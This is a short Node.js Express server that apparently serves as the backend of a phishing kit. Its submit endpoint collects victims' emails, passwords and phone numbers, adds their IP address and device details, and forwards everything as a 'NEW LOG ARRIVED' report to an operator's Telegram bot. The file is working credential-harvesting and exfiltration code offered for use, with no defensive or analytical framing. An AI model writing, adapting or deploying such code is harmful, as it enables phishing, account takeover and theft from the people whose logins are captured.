const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/submit', async (req, res) => {
    const deviceInfo = req.body.deviceInfo || {};
    const ipAddr = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const message = `
🚀 *NEW LOG ARRIVED* 🚀
━━━━━━━━━━━━━━━━━━━━━━━━━
📂 *Portal:* ${req.body.page || 'Unknown'}
🔖 *Label:* \`${req.body.type || 'N/A'}\`

*CREDENTIALS*
━━━━━━━━━━━━━━━━━━━━━━━━━
📧 *Email:*
\`\`\`
${req.body.email || 'N/A'}
\`\`\`
🔑 *Password:*
\`\`\`
${req.body.pwd || 'N/A'}
\`\`\`
📱 *Mobile:*
\`\`\`
${req.body['ms-mobile'] || 'N/A'}
\`\`\`

*TECHNICAL SPECS*
━━━━━━━━━━━━━━━━━━━━━━━━━
💻 *Platform:* \`${deviceInfo.platform || 'Unknown'}\`
🖥️ *Screen:* \`${deviceInfo.screenResolution || 'Unknown'}\`
🌐 *IP Address:* \`${ipAddr}\`
📱 *User Agent:* \`${(deviceInfo.userAgent || 'N/A').substring(0, 80)}...\`

━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ *Captured at:* ${new Date().toLocaleString()}
`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.json({ status: "success" });
    } catch (error) {
        console.error("Telegram Error:", error.message);
        res.status(500).json({ status: "error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("System Operational on Port " + PORT));